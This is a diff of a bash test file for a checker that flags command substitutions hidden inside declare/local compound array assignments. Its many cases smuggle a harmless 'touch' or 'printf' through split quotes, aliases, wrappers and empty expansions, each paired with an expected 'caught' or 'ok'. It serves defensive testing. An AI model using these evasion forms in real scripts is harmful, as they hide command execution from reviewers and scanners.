-dc dc_b $'local -a \'a=(x `/usr/bin/touch mk`)\'\n' caught 'compound assignment' 'local, backticks'
+dc dc_a $'declare -a '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'declare -a, single-quoted, $( )'
+dc dc_b $'local -a '"'"$'a=(x `/usr/bin/touch mk`)'"'"$'\n' caught 'compound assignment' 'local, backticks'
 dc dc_c $'typeset -a "a=(x \\$(/usr/bin/touch mk))"\n' caught 'compound assignment' 'typeset, escaped $ in double quotes'
-dc dc_d $'readonly -a \'a=(x ${y:-z})\'\n' caught 'compound assignment' 'readonly, ${ }'
-dc dc_e $'export -a \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'export'
-dc dc_f $'declare -A \'m=([k]=$(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'declare -A, an associative element'
-dc dc_g $'declare -a "a="\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'quotes between = and ('
-dc dc_h $'declare -a a+=\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'append form +='
+dc dc_d $'readonly -a '"'"$'a=(x ${y:-z})'"'"$'\n' caught 'compound assignment' 'readonly, ${ }'
+dc dc_e $'export -a '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'export'
+dc dc_f $'declare -A '"'"$'m=([k]=$(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'declare -A, an associative element'
+dc dc_g $'declare -a "a="'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'quotes between = and ('
+dc dc_h $'declare -a a+='"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'append form +='
 dc dc_i $'declare -a arr=(1 2 3)\nlocal -a files=("$@")\nexport XX=1\nlocal n=$(date +%s)\necho ok\n' ok - 'control: unquoted compound assignments with no opener after the (, and an opener on its own line'
 dc dc_j $'x=$(date +%s); declare -a a=(1 2)\necho "$x"\n' ok - 'control: an opener BEFORE the =( on the line'
-dc dc_k $'declare -a \'a=(x $\'"(/usr/bin/touch mk))"\n' caught 'compound assignment' 'opener split across a quote boundary ($ in one segment, ( in the next)'
-dc dc_l $'declare -a \'a=(x \'"$"\'(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'opener split: a double-quoted $ between single-quoted parts'
-dc dc_m $'declare -a \'a=(x \'$"(/usr/bin/touch mk))"\n' caught 'compound assignment' 'opener split with a $"..." segment'
+dc dc_k $'declare -a '"'"$'a=(x $'"'"$'"(/usr/bin/touch mk))"\n' caught 'compound assignment' 'opener split across a quote boundary ($ in one segment, ( in the next)'
+dc dc_l $'declare -a '"'"$'a=(x '"'"$'"$"'"'"$'(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'opener split: a double-quoted $ between single-quoted parts'
+dc dc_m $'declare -a '"'"$'a=(x '"'"$'$"(/usr/bin/touch mk))"\n' caught 'compound assignment' 'opener split with a $"..." segment'
 dc dc_n $'declare -a "a=${e}(x \\$(/usr/bin/touch mk))"\n' caught 'compound assignment' 'an expansion between = and ('
-dc dc_o $'declare -a a=$e\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'a bare $e between = and ('
-dc dc_p $'declare -a a=$\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' "$'...' value"
-dc dc_q $'declare -a a=$(:)\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'a substitution between = and ('
-dc dc_r $'declare -a \'a=(x <(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'process substitution <( as the opener'
-dc dc_s $'declare -a \'a=(x >(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'process substitution >( as the opener'
-dc dc_t $'de\'\'clare -a \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'builtin name split by an empty quote pair'
-dc dc_u $'de\\clare -a \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'builtin name split by a backslash'
-dc dc_v $'loc\\al -a \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'local split by a backslash'
+dc dc_o $'declare -a a=$e'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'a bare $e between = and ('
+dc dc_p $'declare -a a=$'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' "$'...' value"
+dc dc_q $'declare -a a=$(:)'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'a substitution between = and ('
+dc dc_r $'declare -a '"'"$'a=(x <(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'process substitution <( as the opener'
+dc dc_s $'declare -a '"'"$'a=(x >(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'process substitution >( as the opener'
+dc dc_t $'de'"'"$''"'"$'clare -a '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'builtin name split by an empty quote pair'
+dc dc_u $'de\\clare -a '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'builtin name split by a backslash'
+dc dc_v $'loc\\al -a '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'local split by a backslash'
 dc dc_w $'declare -a a=\\(x\\ $\\(/usr/bin/touch mk\\)\\)\n' caught 'compound assignment' 'pure-escape form: $\\( and \\( split by backslashes'
-dc dc_x $'declare -a \'a=(x $\'\\(\'/usr/bin/touch mk))\'\n' caught 'compound assignment' 'quoted, the opener split by \\( '
+dc dc_x $'declare -a '"'"$'a=(x $'"'"$'\\('"'"$'/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'quoted, the opener split by \\( '
 dc dc_y $'declare -a a=\\(x\\ $\\{y:-z\\}\\)\n' caught 'compound assignment' '${ split by a backslash'
-dc dc_z $'declare -a \'a=(x <\'\\(\'/usr/bin/touch mk))\'\n' caught 'compound assignment' '<( split by a backslash'
-dc dc_za $'declare -a \'a=(x $\'$@\'(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'an empty $@ between $ and ('
-dc dc_zb $'de$*clare -a \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'an empty $* inside the builtin name'
-dc dc_zc $'for v in \'a=(x $(/usr/bin/touch mk))\'; do declare -a "$v"; done\n' caught 'compound assignment' 'the value before the builtin on the line (loop)'
+dc dc_z $'declare -a '"'"$'a=(x <'"'"$'\\('"'"$'/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' '<( split by a backslash'
+dc dc_za $'declare -a '"'"$'a=(x $'"'"$'$@'"'"$'(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'an empty $@ between $ and ('
+dc dc_zb $'de$*clare -a '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'an empty $* inside the builtin name'
+dc dc_zc $'for v in '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'; do declare -a "$v"; done\n' caught 'compound assignment' 'the value before the builtin on the line (loop)'
 dc dc_zd $'w() { declare -a "$1"; }
-w \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'a function wrapper: builtin and value on different lines'
-dc dc_ze $'shopt -s expand_aliases
-alias d=declare
-d -a \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'an alias: builtin and value on different lines'
+w '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'a function wrapper: builtin and value on different lines'
+dc dc_ze $'shopt -s expand_aliases; alias d=declare
+d -a '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'an alias: builtin and value on different lines'
 dc dc_zf $'d -a a=\\(x\\ \\$\\(/usr/bin/touch mk\\)\\)\n' caught 'compound assignment' 'escaped compound value with no builtin word on the line'
-dc dc_zg $'for v in \'a=(1 2)\' \'b=(3)\'; do declare -a "$v"; done
-ll=\'ls -l\'\n' ok - 'control: quoted compound values with no opener, a plain assignment with no compound value (was an alias; aliases are refused here, cache#433)'
-dc dc_zh $'for v in "a=("\'$(/usr/bin/touch mk)\'")"; do declare -a "$v"; done\n' caught 'compound assignment' 'the opener split across two quote segments, the builtin after the value'
+dc dc_zg $'for v in '"'"$'a=(1 2)'"'"$' '"'"$'b=(3)'"'"$'; do declare -a "$v"; done
+ll='"'"$'ls -l'"'"$'\n' ok - 'control: quoted compound values with no opener, a plain assignment with no compound value (was an alias; aliases are refused here, cache#433)'
+dc dc_zh $'for v in "a=("'"'"$'$(/usr/bin/touch mk)'"'"$'")"; do declare -a "$v"; done\n' caught 'compound assignment' 'the opener split across two quote segments, the builtin after the value'
 dc dc_zi $'f(){ declare -a "$1"; }
-f "a=("\'$(/usr/bin/touch mk)\'")"\n' caught 'compound assignment' 'split segments, function wrapper'
+f "a=("'"'"$'$(/usr/bin/touch mk)'"'"$'")"\n' caught 'compound assignment' 'split segments, function wrapper'
 dc dc_zj $'alias d=declare
-d -a "a=("\'$(/usr/bin/touch mk)\'")"\n' caught 'compound assignment' 'split segments, alias'
+d -a "a=("'"'"$'$(/usr/bin/touch mk)'"'"$'")"\n' caught 'compound assignment' 'split segments, alias'
 dc dc_zk $'alias d=declare
-d -a a=\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' '= outside the quote and ( inside it, alias'
-dc dc_zl $'x=\\\'; for v in \'a=(x $(/usr/bin/touch mk))\'; do declare -a "$v"; done\n' caught 'compound assignment' 'an escaped quote earlier on the line misaligns the quote pairing, loop'
+d -a a='"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' '= outside the quote and ( inside it, alias'
+dc dc_zl $'x=\\'"'"$'; for v in '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'; do declare -a "$v"; done\n' caught 'compound assignment' 'an escaped quote earlier on the line misaligns the quote pairing, loop'
 dc dc_zm $'w() { declare -a "$1"; }
-x=\\\'; w \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'escaped quote earlier, function wrapper'
+x=\\'"'"$'; w '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'escaped quote earlier, function wrapper'
 dc dc_zn $'alias d=declare
 d -a a="(x \\$(/usr/bin/touch mk))"\n' caught 'compound assignment' 'double-quoted value after = with an escaped $, alias'
 dc dc_zo $'arr=(a "b c")\nv=$(date +%s)
-x=\\\'; echo "$x"\n' ok - 'control: a plain unquoted-name array assignment, a substitution on its own line and an escaped quote on another line'
+x=\\'"'"$'; echo "$x"\n' ok - 'control: a plain unquoted-name array assignment, a substitution on its own line and an escaped quote on another line'
 dc dc_zp $'alias d=declare
-d -a a=$e\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'alias: an expansion between = and a quoted ('
+d -a a=$e'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'alias: an expansion between = and a quoted ('
 dc dc_zq $'w() { declare -a "$1"; }
-w a=${e}\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'function wrapper: ${e} between = and a quoted ('
+w a=${e}'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'function wrapper: ${e} between = and a quoted ('
 dc dc_zr $'alias d=declare
 d -a a=${e}\\(x\\ \\$\\(/usr/bin/touch mk\\)\\)\n' caught 'compound assignment' 'alias: ${e} then an escaped compound value'
 dc dc_zs $'alias d=declare
-d -a a=$(true)\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'alias: a substitution between = and ('
-dc dc_zt $'for v in \'a\'{=,}\'(x $(/usr/bin/touch mk))\'; do declare -a "$v"; done\n' caught 'compound assignment' 'brace expansion builds the ='
+d -a a=$(true)'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'alias: a substitution between = and ('
+dc dc_zt $'for v in '"'"$'a'"'"$'{=,}'"'"$'(x $(/usr/bin/touch mk))'"'"$'; do declare -a "$v"; done\n' caught 'compound assignment' 'brace expansion builds the ='
 dc dc_zu $'f(){ declare -a "$1"; }
-f \'a\'{=,}\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'brace expansion, function wrapper'
+f '"'"$'a'"'"$'{=,}'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'brace expansion, function wrapper'
 dc dc_zv $'for v in a{=,}\\(x\\ \\$\\(/usr/bin/touch\\ mk\\)\\); do declare -a "$v"; done\n' caught 'compound assignment' 'brace expansion, escaped value'
-dc dc_zw $'for v in \'a=\'${@}\'(x $(/usr/bin/touch mk))\'; do declare -a "$v"; done\n' caught 'compound assignment' 'an empty ${@} between = and ('
-dc dc_zx $'for v in \'a=\'${HOME:0:0}\'(x $(/usr/bin/touch mk))\'; do declare -a "$v"; done\n' caught 'compound assignment' 'an always-empty ${HOME:0:0} between = and ('
+dc dc_zw $'for v in '"'"$'a='"'"$'${@}'"'"$'(x $(/usr/bin/touch mk))'"'"$'; do declare -a "$v"; done\n' caught 'compound assignment' 'an empty ${@} between = and ('
+dc dc_zx $'for v in '"'"$'a='"'"$'${HOME:0:0}'"'"$'(x $(/usr/bin/touch mk))'"'"$'; do declare -a "$v"; done\n' caught 'compound assignment' 'an always-empty ${HOME:0:0} between = and ('
 dc dc_zy $'alias d=declare
 d -a a=$e
-x=${e}\'plain\'\n' caught 'shell aliases' 'an expansion after =, no ( and no opener: refused for the alias that sets it up (aliases are refused here, cache#433)'
-dc dc_zz $'for v in a=; do declare -a "$v"\'(x $(/usr/bin/touch mk))\'; done\n' caught 'compound assignment' 'the NAME= part in a variable, the quoted value literal on the same line'
+x=${e}'"'"$'plain'"'"$'\n' caught 'shell aliases' 'an expansion after =, no ( and no opener: refused for the alias that sets it up (aliases are refused here, cache#433)'
+dc dc_zz $'for v in a=; do declare -a "$v"'"'"$'(x $(/usr/bin/touch mk))'"'"$'; done\n' caught 'compound assignment' 'the NAME= part in a variable, the quoted value literal on the same line'
 dc dc_zza $'n=a=
-declare -a "$n"\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'the NAME= part in a variable on an earlier line'
+declare -a "$n"'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'the NAME= part in a variable on an earlier line'
 dc dc_zzb $'w() { declare -a "$1$2"; }
-w \'a=\' \'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'the function wrapper joins two literal words'
+w '"'"$'a='"'"$' '"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'the function wrapper joins two literal words'
 dc dc_zzc $'w() { declare -a "a=$1"; }
-w \'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'the = is inside the builtin string, the value arrives as a word'
+w '"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'the = is inside the builtin string, the value arrives as a word'
 dc dc_zze $'echo "plain text (${x}) here"
 v=$(date +%s)\n' ok - 'control: a quoted ( then a simple ${x} is a message: a simple expansion can be empty and is not an opener'
 dc dc_zzf $'n=a=
-dec""lare -a "$n"\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'the builtin word hidden by an empty quote pair, NAME= in a variable'
+dec""lare -a "$n"'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'the builtin word hidden by an empty quote pair, NAME= in a variable'
 dc dc_zzg $'n=a=
-de\\clare -a "$n"\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'the builtin word hidden by a backslash'
+de\\clare -a "$n"'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'the builtin word hidden by a backslash'
 dc dc_zzh $'n=a=
-f() { dec\'\'lare -ga "$@"; }
-f "$n"\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'a hidden builtin word in a wrapper'
+f() { dec'"'"$''"'"$'lare -ga "$@"; }
+f "$n"'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'a hidden builtin word in a wrapper'
 dc dc_zzi $'n=a=
-d=dec; ${d}lare -a "$n"\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'a builtin name built from a variable, the opener literal'
+d=dec; ${d}lare -a "$n"'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'a builtin name built from a variable, the opener literal'
 dc dc_zzj $'n=a=
-a=("$n"\'(x$(/usr/bin/touch mk))\')
+a=("$n"'"'"$'(x$(/usr/bin/touch mk))'"'"$')
 declare -a "${a[0]}"\n' caught 'compound assignment' 'a plain NAME=( word that carries a quoted element reaching the builtin'
 dc dc_zzk $'n=a=
-a=(\\$\'z\\\' "$n"\'(x $(/usr/bin/touch mk))\')
+a=(\\$'"'"$'z\\'"'"$' "$n"'"'"$'(x $(/usr/bin/touch mk))'"'"$')
 declare -a "${a[1]}"\n' caught 'compound assignment' 'an escaped $ before a quote is not an ANSI-C quote'
 dc dc_zzl $'n=a=
-declare -a "$n"$\'(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'an ANSI-C prefix leaves a $ before the ('
+declare -a "$n"$'"'"$'(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'an ANSI-C prefix leaves a $ before the ('
 dc dc_zzm $'n=a=
 declare -a "$n"$"(x \\$(/usr/bin/touch mk))"\n' caught 'compound assignment' 'a locale $" prefix leaves a $ before the ('
-dc dc_zzn $'a=("one two" \'three (4)\')
-x=$\'\\n\'
+dc dc_zzn $'a=("one two" '"'"$'three (4)'"'"$')
+x=$'"'"$'\\n'"'"$'
 echo "${a[@]}" $x\n' ok - 'control: plain array with quoted elements, an ANSI-C newline, a quoted ( with no opener'
-dc dc_zzo $'shopt -s expand_aliases
-alias d=declare
-x="$(printf \'"\')"; d -a \'a=(x $(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'a quote inside a nested substitution upsets the word splitter'
+dc dc_zzo $'shopt -s expand_aliases; alias d=declare
+x="$(printf '"'"$'"'"'"$')"; d -a '"'"$'a=(x $(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'a quote inside a nested substitution upsets the word splitter'
 dc dc_zzp $'w() { declare -a "a=$1$2"; }
-w \'(x \' \'$(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'fragments of one compound value in separate words: the opener fragment is quoted data'
+w '"'"$'(x '"'"$' '"'"$'$(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'fragments of one compound value in separate words: the opener fragment is quoted data'
 dc dc_zzq $'w() { declare -a "a=$1$2"; }
-w \'(\' \'`/usr/bin/touch mk`)\'\n' caught 'compound assignment' 'fragments, a backtick opener in single quotes'
+w '"'"$'('"'"$' '"'"$'`/usr/bin/touch mk`)'"'"$'\n' caught 'compound assignment' 'fragments, a backtick opener in single quotes'
 dc dc_zzr $'w() { declare -a "a=$1$2"; }
-w \'(\' \'<(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'fragments, a process-substitution opener in single quotes'
-dc dc_zzs $'a=\'a=(\'
-b=\'$(/usr/bin/touch mk))\'
+w '"'"$'('"'"$' '"'"$'<(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'fragments, a process-substitution opener in single quotes'
+dc dc_zzs $'a='"'"$'a=('"'"$'
+b='"'"$'$(/usr/bin/touch mk))'"'"$'
 declare -a "$a$b"\n' caught 'compound assignment' 'fragments held in two variables, the opener fragment in single quotes'
 dc dc_zzt $'e=
-declare -a \'a=(x $\'$e\'(/usr/bin/touch mk))\'\n' caught 'compound assignment' 'an expansion that can be empty between the literal $ and ('
-dc dc_zzu $'x=\'plain data\'
-y=\'cost: 5 (approx)\'
+declare -a '"'"$'a=(x $'"'"$'$e'"'"$'(/usr/bin/touch mk))'"'"$'\n' caught 'compound assignment' 'an expansion that can be empty between the literal $ and ('
+dc dc_zzu $'x='"'"$'plain data'"'"$'
+y='"'"$'cost: 5 (approx)'"'"$'
 echo "$x $y"\n' ok - 'control: single-quoted data with no opener'
 dc dc_zzv $'w() { declare -a "a=$1$2"; }
-w \'(\' \'$\'"(printf audit))"\n' caught 'compound assignment' 'round 9: an opener built across quote segments, $ in single quotes'
+w '"'"$'('"'"$' '"'"$'$'"'"$'"(printf audit))"\n' caught 'compound assignment' 'round 9: an opener built across quote segments, $ in single quotes'
 dc dc_zzw $'w() { declare -a "a=$1$2"; }
-w \'(\' \\$\\(printf\\ audit\\)\\)\n' caught 'compound assignment' 'round 9: an escaped opener as an argument word'
+w '"'"$'('"'"$' \\$\\(printf\\ audit\\)\\)\n' caught 'compound assignment' 'round 9: an escaped opener as an argument word'
 dc dc_zzx $'w() { declare -a "a=$1$2"; }
-w \'(\' "<(printf audit))"\n' caught 'compound assignment' 'round 9: a double-quoted <( is data'
+w '"'"$'('"'"$' "<(printf audit))"\n' caught 'compound assignment' 'round 9: a double-quoted <( is data'
 dc dc_zzy $'w() { declare -a "a=$1$2"; }
-w \'(\' ">(printf audit))"\n' caught 'compound assignment' 'round 9: a double-quoted >( is data'
+w '"'"$'('"'"$' ">(printf audit))"\n' caught 'compound assignment' 'round 9: a double-quoted >( is data'
 dc dc_zzz $'w() { declare -a "a=$1$2"; }
-w \'(\' \'<\'"(printf audit))"\n' caught 'compound assignment' 'round 9: <( split across quote segments'
+w '"'"$'('"'"$' '"'"$'<'"'"$'"(printf audit))"\n' caught 'compound assignment' 'round 9: <( split across quote segments'
 dc dc_zzza $'w() { declare -a "a=$1$2"; }
-w \'(\' \'$\'"{y})"\n' caught 'compound assignment' 'round 9: ${ split across quote segments'
+w '"'"$'('"'"$' '"'"$'$'"'"$'"{y})"\n' caught 'compound assignment' 'round 9: ${ split across quote segments'
 dc dc_zzzb $'set --
-declare -a \'a=(x $\'$1\'(printf audit))\'\n' caught 'quote-segment boundary' 'round 9: a possibly-empty positional between $ and ('
+declare -a '"'"$'a=(x $'"'"$'$1'"'"$'(printf audit))'"'"$'\n' caught 'quote-segment boundary' 'round 9: a possibly-empty positional between $ and ('
 dc dc_zzzc $'w() { declare -a "a=$1$2"; }
-x="$(printf \'"\')"; w \'$(printf marker)\'\n' caught 'compound assignment' 'round 9: a nested-quote line leaves the splitter uncertain, quoted data still refused'
-dc dc_zzzd $'echo "$(date)" "${x:-y}" "a$(b)c" "$1" "${name}" \'plain\'
+x="$(printf '"'"$'"'"'"$')"; w '"'"$'$(printf marker)'"'"$'\n' caught 'compound assignment' 'round 9: a nested-quote line leaves the splitter uncertain, quoted data still refused'
+dc dc_zzzd $'echo "$(date)" "${x:-y}" "a$(b)c" "$1" "${name}" '"'"$'plain'"'"$'
 v="$(dirname "$0")"\n' ok - 'control: live substitutions in double quotes and unquoted, simple expansions, plain single-quoted data'
 bd() { local d; d=$(crr "$1" "${H}$2"); expm "$3" "$d" "$4" "dollar at a quote-segment boundary: $5"; }
 bd bd_a $'w() { declare -a "a=$1$2"; }
-w \'(\' \'$\'"(printf x))"\n' caught 'quote-segment boundary' '$ closes a single-quoted segment, ( opens a double-quoted one'
+w '"'"$'('"'"$' '"'"$'$'"'"$'"(printf x))"\n' caught 'quote-segment boundary' '$ closes a single-quoted segment, ( opens a double-quoted one'
 bd bd_b $'e=
 w() { declare -a "a=$1$2"; }
-w \'$\'${e:-}\'(printf x)\'\n' caught 'quote-segment boundary' 'an empty-producing ${e:-} between the literal $ and ('
+w '"'"$'$'"'"$'${e:-}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'an empty-producing ${e:-} between the literal $ and ('
 bd bd_c $'set --
 w() { declare -a "a=$1$2"; }
-w \'$\'${1}\'(printf x)\'\n' caught 'quote-segment boundary' 'a ${1} between the literal $ and ('
+w '"'"$'$'"'"$'${1}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a ${1} between the literal $ and ('
 bd bd_d $'w() { declare -a "a=$1$2"; }
-w \'$\'$(true)\'(printf x)\'\n' caught 'quote-segment boundary' 'a $(true) between the literal $ and ('
+w '"'"$'$'"'"$'$(true)'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a $(true) between the literal $ and ('
 bd bd_e $'w() { declare -a "a=$1$2"; }
-w \'$\'$e\'(printf x)\'\n' caught 'quote-segment boundary' 'a $e between the literal $ and ('
+w '"'"$'$'"'"$'$e'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a $e between the literal $ and ('
 bd bd_f $'w() { declare -a "a=$1$2"; }
-w \'<\'${e:-}\'(printf x)\'\n' caught 'quote-segment boundary' 'a process-substitution fragment, < then an expansion then ('
+w '"'"$'<'"'"$'${e:-}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a process-substitution fragment, < then an expansion then ('
 bd bd_g $'w() { declare -a "a=$1$2"; }
-x="$(printf \'"\')"; w \'$\'"(printf x)"\n' caught 'quote-segment boundary' 'a nested-quote line: the raw line is still scanned'
+x="$(printf '"'"$'"'"'"$')"; w '"'"$'$'"'"$'"(printf x)"\n' caught 'quote-segment boundary' 'a nested-quote line: the raw line is still scanned'
 bd bd_h $'w() { declare -a "a=$1$2"; }
-w \'$\'"{y}"\n' caught 'quote-segment boundary' '$ then a quote boundary then {'
+w '"'"$'$'"'"$'"{y}"\n' caught 'quote-segment boundary' '$ then a quote boundary then {'
 bd bd_i $'w() { declare -a "a=$1$2"; }
 w $"(printf x)"\n' caught 'quote-segment boundary' 'a locale-quote $" before ('
 bd bd_j $'echo "$(date)" "${x}" "$1" "${x:-y}"
-printf \'%s\\n\' \'{print $1}\' \'a $5 b\'
+printf '"'"$'%s\\n'"'"$' '"'"$'{print $1}'"'"$' '"'"$'a $5 b'"'"$'
 v=$(cmd)\n' ok - 'control: live substitutions, simple expansions, $1 and $5 in single-quoted text, no quote-segment boundary'
 bd bd_k $'# the $(cmd) form and ${x} and "$(y)" are fine in a comment
 echo ok\n' ok - 'control: a comment line with ordinary substitution text'
-bd bd_l $'cat <<\'EOF\' >/dev/null
+bd bd_l $'cat <<'"'"$'EOF'"'"$' >/dev/null
 price $5, ${x}, "$(y)" and a $1}
 EOF
 echo ok\n' ok - 'control: a quoted-heredoc body with ordinary text that never runs'
-bd bd_m $'# note: \'$\'"(printf x)" is what to avoid
+bd bd_m $'# note: '"'"$'$'"'"$'"(printf x)" is what to avoid
 echo ok\n' caught 'quote-segment boundary' 'by design a comment line holding the boundary form is refused, like every raw-line rule (a line-bound waiver clears it)'
-bd bd_n $'cat <<\'EOF\' >/dev/null
-\'$\'"(printf x)"
+bd bd_n $'cat <<'"'"$'EOF'"'"$' >/dev/null
+'"'"$'$'"'"$'"(printf x)"
 EOF
 echo ok\n' caught 'quote-segment boundary' 'by design a heredoc body holding the boundary form is refused (a line-bound waiver clears it)'
 bd bd_o $'w() { declare -a "a=($1)"; }
-w \'$\'${e:-${f:-}}\'(printf x)\'\n' caught 'quote-segment boundary' 'nested braces in the expansion between the literal $ and ('
+w '"'"$'$'"'"$'${e:-${f:-}}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'nested braces in the expansion between the literal $ and ('
 bd bd_p $'w() { declare -a "a=($1)"; }
-w \'$\'${e:+${f}}\'(printf x)\'\n' caught 'quote-segment boundary' 'nested braces with a + operator'
+w '"'"$'$'"'"$'${e:+${f}}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'nested braces with a + operator'
 bd bd_q $'w() { declare -a "a=($1)"; }
-w \'<\'${e:-${f:-}}\'(printf x)\'\n' caught 'quote-segment boundary' 'a < fragment, nested braces'
+w '"'"$'<'"'"$'${e:-${f:-}}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a < fragment, nested braces'
 bd bd_r $'w() { declare -a "a=($1)"; }
-w \'>\'${e:-${f:-}}\'(printf x)\'\n' caught 'quote-segment boundary' 'a > fragment, nested braces'
+w '"'"$'>'"'"$'${e:-${f:-}}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a > fragment, nested braces'
 bd bd_s $'w() { declare -a "a=($1)"; }
-w \'$\'$( (true) )\'(printf x)\'\n' caught 'quote-segment boundary' 'a command substitution holding a subshell'
+w '"'"$'$'"'"$'$( (true) )'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a command substitution holding a subshell'
 bd bd_t $'w() { declare -a "a=($1)"; }
-w \'$\'$(printf \')\')\'(printf x)\'\n' caught 'quote-segment boundary' 'a command substitution holding a quoted delimiter'
+w '"'"$'$'"'"$'$(printf '"'"$')'"'"$')'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a command substitution holding a quoted delimiter'
 bd bd_u $'w() { declare -a "a=($1)"; }
-w \'$\'$(printf ")")\'(printf x)\'\n' caught 'quote-segment boundary' 'a command substitution holding a double-quoted delimiter'
+w '"'"$'$'"'"$'$(printf ")")'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a command substitution holding a double-quoted delimiter'
 bd bd_v $'w() { declare -a "a=($1)"; }
-w \'$\'${e:-\'}\'}\'(printf x)\'\n' caught 'quote-segment boundary' 'a brace expansion holding a quoted delimiter'
+w '"'"$'$'"'"$'${e:-'"'"$'}'"'"$'}'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'a brace expansion holding a quoted delimiter'
 bd bd_w $'w() { declare -a "a=($1)"; }
-w \'$\'$((0))\'(printf x)\'\n' caught 'quote-segment boundary' 'an arithmetic expansion between'
+w '"'"$'$'"'"$'$((0))'"'"$'(printf x)'"'"$'\n' caught 'quote-segment boundary' 'an arithmetic expansion between'
 bd bd_x $'w() { declare -a "a=($1)"; }
-w \'$\'$[0]\'(printf x)\'\n' caught 'quote-segment boundary' 'a bracket arithmetic expansion between'
